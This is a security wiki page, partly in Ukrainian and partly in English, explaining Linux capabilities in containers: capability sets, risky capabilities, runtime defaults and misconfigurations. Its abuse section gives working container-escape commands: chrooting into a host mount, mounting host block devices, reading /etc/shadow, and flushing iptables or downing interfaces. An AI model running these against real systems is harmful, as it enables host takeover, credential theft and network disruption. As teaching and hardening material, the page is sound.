# Можливості Linux у контейнерах

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

Linux capabilities — одна з найважливіших складових безпеки контейнерів, оскільки вони відповідають на тонке, але фундаментальне питання: **що насправді означає "root" всередині контейнера?** На звичайній системі Linux UID 0 історично означав дуже широкий набір привілеїв. У сучасних ядрах цей привілей розбитий на менші одиниці, що називаються capabilities. Процес може працювати як root і при цьому не мати доступу до багатьох потужних операцій, якщо відповідні capabilities були видалені.

Контейнери значною мірою залежать від цього розрізнення. Багато робочих навантажень все ще запускаються як UID 0 всередині контейнера з міркувань сумісності або простоти. Без відкидання capabilities це було б надто небезпечно. Завдяки відкиданню capabilities процес root у контейнері все ще може виконувати багато звичайних внутрішніх завдань, але буде позбавлений більш чутливих операцій ядра. Саме тому оболонка в контейнері, яка показує `uid=0(root)`, не означає автоматично «host root» або навіть «широкі привілеї ядра». Набір capabilities вирішує, скільки насправді варта ця ідентичність root.

Для повного довідника по Linux capabilities та численних прикладів зловживань див.:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Принцип роботи

Capabilities відстежуються в кількох наборах, включаючи permitted, effective, inheritable, ambient та bounding sets. Для багатьох оцінок безпеки контейнерів точна семантика ядра кожного набору менш критична, ніж практичне питання: **які привілейовані операції цей процес може успішно виконати прямо зараз, і які можливі майбутні набуття привілеїв?**

Причина, чому це важливо, полягає в тому, що багато технік виходу з контейнера насправді є проблемами capabilities, замаскованими під контейнерні проблеми. Робоче навантаження з `CAP_SYS_ADMIN` може отримати величезний доступ до функціональності ядра, яку звичайний root у контейнері не повинен торкатися. Робоче навантаження з `CAP_NET_ADMIN` стає набагато небезпечнішим, якщо воно також ділиться host network namespace. Робоче навантаження з `CAP_SYS_PTRACE` стає цікавішим, якщо воно бачить процеси хоста через host PID sharing. У Docker або Podman це може з’явитися як `--pid=host`; у Kubernetes зазвичай це вказується як `hostPID: true`.

Іншими словами, набір capabilities не можна оцінювати ізольовано. Його потрібно розглядати разом із namespaces, seccomp і MAC policy.

## Лабораторія

Дуже прямий спосіб переглянути capabilities всередині контейнера такий:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Ви також можете порівняти більш обмежений контейнер із контейнером, якому додано всі capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Щоб побачити ефект вузького додавання, спробуйте видалити все й додати назад лише одну capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
These small experiments help show that a runtime is not simply toggling a boolean called "privileged". It is shaping the actual privilege surface available to the process.

## High-Risk Capabilities

Although many capabilities can matter depending on the target, a few are repeatedly relevant in container escape analysis.

**`CAP_SYS_ADMIN`** — це те, до чого захисникам слід ставитись із найбільшою підозрою. Його часто описують як "the new root", бо він відкриває величезну кількість функціональності, включно з операціями, пов'язаними з mount, поведінкою, чутливою до namespace, та багатьма шляхами в ядрі, які ніколи не слід випадково відкривати контейнерам. Якщо контейнер має `CAP_SYS_ADMIN`, слабкий seccomp і відсутнє сильне MAC confinement, багато класичних breakout paths стають набагато реалістичнішими.

**`CAP_SYS_PTRACE`** має значення там, де існує видимість процесів, особливо якщо PID namespace поділено з host або з цікавими сусідніми workloads. Воно може перетворити видимість на tampering.

**`CAP_NET_ADMIN`** і **`CAP_NET_RAW`** важливі в середовищах, орієнтованих на мережу. На ізольованій bridge network вони можуть уже бути ризикованими; у спільному host network namespace вони набагато гірші, тому що workload може переналаштувати host networking, sniff, spoof або перешкоджати локальним потокам трафіку.

**`CAP_SYS_MODULE`** зазвичай катастрофічний у rootful середовищі, оскільки завантаження kernel modules фактично означає контроль над host-kernel. Він майже ніколи не має з'являтися в загальнопризначеному контейнерному workload.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O all use capability controls, but the defaults and management interfaces differ. Docker exposes them very directly through flags such as `--cap-drop` and `--cap-add`. Podman exposes similar controls and frequently benefits from rootless execution as an additional safety layer. Kubernetes surfaces capability additions and drops through the Pod or container `securityContext`. System-container environments such as LXC/Incus also rely on capability control, but the broader host integration of those systems often tempts operators into relaxing defaults more aggressively than they would in an app-container environment.

The same principle holds across all of them: a capability that is technically possible to grant is not necessarily one that should be granted. Many real-world incidents begin when an operator adds a capability simply because a workload failed under a stricter configuration and the team needed a quick fix.

## Misconfigurations

The most obvious mistake is **`--cap-add=ALL`** in Docker/Podman-style CLIs, but it is not the only one. In practice, a more common problem is granting one or two extremely powerful capabilities, especially `CAP_SYS_ADMIN`, to "make the application work" without also understanding the namespace, seccomp, and mount implications. Another common failure mode is combining extra capabilities with host namespace sharing. In Docker or Podman this may appear as `--pid=host`, `--network=host`, or `--userns=host`; in Kubernetes the equivalent exposure usually appears through workload settings such as `hostPID: true` or `hostNetwork: true`. Each of those combinations changes what the capability can actually affect.

It is also common to see administrators believe that because a workload is not fully `--privileged`, it is still meaningfully constrained. Sometimes that is true, but sometimes the effective posture is already close enough to privileged that the distinction stops mattering operationally.

## Abuse

The first practical step is to enumerate the effective capability set and immediately test the capability-specific actions that would matter for escape or host information access:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Якщо присутній `CAP_SYS_ADMIN`, спочатку перевірте mount-based abuse та host filesystem access, оскільки це один із найпоширеніших breakout enablers:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Якщо `CAP_SYS_PTRACE` присутній і контейнер бачить цікаві процеси, перевірте, чи можна цю capability використати для інспекції процесів:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Якщо присутні `CAP_NET_ADMIN` або `CAP_NET_RAW`, перевірте, чи може робоче навантаження маніпулювати видимим мережевим стеком або принаймні збирати корисну мережеву інформацію:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Коли тест capability вдається, поєднуйте його зі станом namespace. Capability, який у ізольованому namespace виглядає лише ризиковим, може миттєво стати примітивом для escape або host-recon, якщо контейнер також ділиться host PID, host network або host mounts.

### Повний приклад: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Якщо контейнер має `CAP_SYS_ADMIN` і записуваний bind mount файлової системи хоста, наприклад `/host`, шлях до escape часто є простим:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Якщо `chroot` вдасться, команди тепер виконуються в контексті кореневого файлового простору хоста:
```bash
id
hostname
cat /etc/shadow | head
```
Якщо `chroot` недоступний, того ж результату часто можна досягти, запустивши бінарний файл через змонтоване дерево:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Повний приклад: `CAP_SYS_ADMIN` + доступ до пристрою

Якщо блоковий пристрій з хоста виставлено, `CAP_SYS_ADMIN` може перетворити його на прямий доступ до файлової системи хоста:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Повний приклад: `CAP_NET_ADMIN` + хостова мережа

Ця комбінація не завжди безпосередньо дає host root, але може повністю переналаштувати мережевий стек хоста:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Це може дозволити denial of service, traffic interception або доступ до сервісів, які раніше були відфільтровані.

## Checks

Мета capability checks — не лише dump raw values, а й зрозуміти, чи має процес достатні привілеї, щоб зробити його поточний namespace і mount небезпечними.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Що тут цікаво:

- `capsh --print` — найпростіший спосіб виявити високоризикові capabilities, такі як `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, або `cap_sys_module`.
- Рядок `CapEff` у `/proc/self/status` показує, які capabilities фактично діють зараз, а не лише ті, що можуть бути доступні в інших наборах.
- Дамп capabilities набуває значно більшої важливості, якщо контейнер також ділить host PID, network або user namespaces, або має записувані host mounts.

Після збору сирих даних про capabilities наступним кроком є інтерпретація. Запитайте, чи процес root, чи user namespaces активні, чи host namespaces поділяються, чи seccomp застосовується (enforcing), і чи AppArmor або SELinux все ще обмежують процес. Набір capabilities сам по собі — лише частина картини, але часто саме він пояснює, чому один container breakout працює, а інший зазнає невдачі при тій самій видимій відправній точці.

## Налаштування runtime за замовчуванням

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | За замовчуванням — зменшений набір capabilities | Docker тримає дефолтний allowlist capabilities і відкидає решту | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | За замовчуванням — зменшений набір capabilities | Контейнери Podman за замовчуванням unprivileged і використовують зменшену модель capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Наслідує налаштування runtime за замовчуванням, якщо не змінено | Якщо не вказано `securityContext.capabilities`, контейнер отримує набір capabilities за замовчуванням від runtime | `securityContext.capabilities.add`, невиконання `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Зазвичай — налаштування runtime за замовчуванням | Ефективний набір залежить від runtime та Pod spec | те саме, що й у рядку Kubernetes; пряма конфігурація OCI/CRI також може явно додавати capabilities |

Для Kubernetes важливо, що API не визначає єдиного універсального набору capabilities за замовчуванням. Якщо Pod не додає і не видаляє capabilities, робоче навантаження наслідує дефолтний набір runtime для цього вузла.
{{#include ../../../../banners/hacktricks-training.md}}
